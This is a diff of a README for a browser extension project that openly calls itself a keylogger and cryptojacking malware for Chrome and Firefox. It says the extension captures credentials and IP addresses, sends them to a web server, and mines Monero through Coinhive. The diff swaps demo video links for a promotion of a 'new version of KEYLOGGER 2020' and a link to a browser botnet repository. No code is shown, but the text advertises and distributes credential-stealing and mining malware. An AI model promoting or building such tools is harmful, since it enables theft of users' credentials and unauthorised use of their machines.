@@ -1,11 +1,9 @@
 # coinhive-chrome-mozilla
 keylogger + cryptojacking extension chrome and mozilla ,basic malware browser,  Keylogger capture credentials,IP ,and send inormations to a server web , mining monero with coinhive, you need just a key with coinhive
 
-demo video YOUTUB
+Download the New version of KEYLOGGER 2020 : best
 
-chrome extension: https://www.youtube.com/watch?v=yMUwwM5QWgc&feature=youtu.be
-
-adon Mozilla https://www.youtube.com/watch?v=KaKZtF2Py0U&feature=youtu.be
+https://github.com/hakanonymos/botnet-browser-chrome
 
 
 # Requirements
